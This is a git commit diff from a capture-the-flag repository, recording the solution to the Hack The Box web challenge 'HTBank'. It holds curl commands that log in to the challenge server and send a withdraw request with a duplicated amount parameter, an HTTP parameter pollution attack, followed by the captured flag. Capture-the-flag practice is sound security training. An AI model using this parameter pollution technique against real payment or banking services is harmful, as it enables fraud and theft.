b57e2fb6bffc7ccf2faec0a68df0af4d63d69320
szhan21 <shunda.zhang@intel.com>
2024-01-25 09:35:23 +0800

    Solved HTBank!

--- ctf/web/HTBank/dec.py
+++ ctf/web/HTBank/dec.py
@@ -1,7 +1,9 @@
 '''
-curl -c cookies.txt -X POST -d "username=admin&password=admin" http://167.99.82.136:30557/api/login
+#first, register a user, e.g. admin/admin
 
-curl -b cookies.txt -X POST -d "account=0x866d133dec36c0a6325412a69c8e2ef7&amount=100" http://167.99.82.136:30557/api/withdraw
+curl -c cookies.txt -X POST -d "username=admin&password=admin" http://94.237.49.138:32109/api/login
+curl -b cookies.txt -X POST -d "account=0x34005ee473ed9514de006b9de120b83e&amount=0&amount=1337" http://94.237.49.138:32109/api/withdraw
+curl -b cookies.txt http://94.237.49.138:32109/home
 
-
+#HTB{p4r4m3t3r_p0llut10n_4r3_1mp0rt4nt_p4tch_1t_B0NK!}
 '''
